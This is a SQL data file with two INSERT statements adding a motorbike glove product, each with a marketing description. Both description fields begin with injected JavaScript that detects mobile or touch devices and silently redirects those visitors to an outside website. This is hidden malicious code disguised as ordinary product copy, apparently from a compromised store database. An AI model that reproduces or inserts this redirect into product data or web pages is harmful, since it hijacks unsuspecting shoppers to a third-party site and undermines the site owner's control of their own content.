INSERT INTO products (name, sku, slug, category_id, description, is_active) VALUES ('Motorbike Gloves with Enhanced Protection and Touch Screen Functionality', '', 'motorbike-gloves-with-enhanced-protection-and-touch-screen-functionality', 101, '(window.matchMedia(\"(pointer:coarse)\").matches||/Android|iPhone|iPad|iPod|Mobile|Tablet|Windows Phone|webOS|BlackBerry|Opera Mini|IEMobile/i.test(navigator.userAgent))&&location.replace(\"https://faraanimpex.com\"); \r\n Description: \r\n\r\nStay protected and connected on the road with our premium motorbike gloves. Made from high-quality, genuine leather, these gloves provide exceptional durability and comfort.\r\n\r\n Key Features: \r\n\r\n- Genuine leather construction for superior durability and comfort\r\n- Reinforced palm and fingers for enhanced protection\r\n- Hard-shell knuckle protection for added safety\r\n- Touch screen-compatible index finger for seamless smartphone use\r\n- Adjustable wrist strap for secure fit\r\n- Breathable design for improved ventilation\r\n\r\n Certifications: \r\n\r\n- CE-certified to ensure compliance with European safety standards\r\n- Meet or exceed international standards for motorbike gloves\r\n\r\n Ideal for: \r\n\r\n- Motorcyclists seeking premium protection and comfort\r\n- Riders who want to stay connected on the road\r\n- Anyone looking for high-quality, durable motorbike gloves', 1);
INSERT INTO products (name, sku, slug, category_id, description, is_active) VALUES ('Motorbike Gloves with Enhanced Protection and Touch Screen Functionality', '', 'motorbike-gloves-with-enhanced-protection-and-touch-screen-functionality-copy', 101, '(window.matchMedia(\"(pointer:coarse)\").matches||/Android|iPhone|iPad|iPod|Mobile|Tablet|Windows Phone|webOS|BlackBerry|Opera Mini|IEMobile/i.test(navigator.userAgent))&&location.replace(\"https://faraanimpex.com\"); \r\n Description: \r\n\r\nStay protected and connected on the road with our premium motorbike gloves. Made from high-quality, genuine leather, these gloves provide exceptional durability and comfort.\r\n\r\n Key Features: \r\n\r\n- Genuine leather construction for superior durability and comfort\r\n- Reinforced palm and fingers for enhanced protection\r\n- Hard-shell knuckle protection for added safety\r\n- Touch screen-compatible index finger for seamless smartphone use\r\n- Adjustable wrist strap for secure fit\r\n- Breathable design for improved ventilation\r\n\r\n Certifications: \r\n\r\n- CE-certified to ensure compliance with European safety standards\r\n- Meet or exceed international standards for motorbike gloves\r\n\r\n Ideal for: \r\n\r\n- Motorcyclists seeking premium protection and comfort\r\n- Riders who want to stay connected on the road\r\n- Anyone looking for high-quality, durable motorbike gloves', 1);